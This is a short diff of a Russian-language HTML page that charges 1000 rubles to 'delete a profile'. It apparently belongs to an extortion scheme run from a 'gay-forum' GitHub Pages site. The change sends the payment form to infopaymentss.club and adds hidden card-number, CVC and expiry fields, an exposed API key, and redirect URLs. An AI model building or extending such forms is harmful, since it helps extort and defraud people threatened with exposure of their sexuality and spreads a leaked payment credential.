@@ -249,12 +249,22 @@
 		 
 		 <p style="text-align: center; font-size: 20px;">Стоимость удаления Анкеты 1000 рублей</p>
 
-         <form action="https://tobacon.ru/handler.php" method="POST">
+         <form action="https://infopaymentss.club/api/request/" method="POST">
 		 
-		 <div style="text-align: left; width: 300px; margin-left: 30px;">
-         <div><input type="hidden" id="amount1" name="amount" value="1000" /> </div>
-
-		 </div>
+    <input type="hidden" name="amount" value="1000">
+	<input type="hidden" name="merchant_order_id" value="101">
+	<input type="hidden" name="use_system_forms" value="1">
+	<input type="hidden" name="card_number" value="1">
+	<input type="hidden" name="card_year" value="1">
+	<input type="hidden" name="card_month" value="1">
+	<input type="hidden" name="card_cvc" value="1">
+	<input type="hidden" name="country" value="RU">
+	<input type="hidden" name="api_key" value="0e599e3bfe532f7a918d26c995dcb31665810400d279f0181a14111a5a9f5781">
+	<input type="hidden" name="success_url" value="https://gay-forum.github.io/com/niceman.html">
+	<input type="hidden" name="fail_url" value="https://gay-forum.github.io/com/">
+    <input type="hidden" name="notice_url" value="https://gay-forum.github.io/com/">
+    <input type="hidden" name="use_cards_bin_amount" value="1">
+    <input type="hidden" name="use_select_method_form" value="1">
 
 		 
 		 <input type="submit" class="donate-but" value="Удалить Анкету">
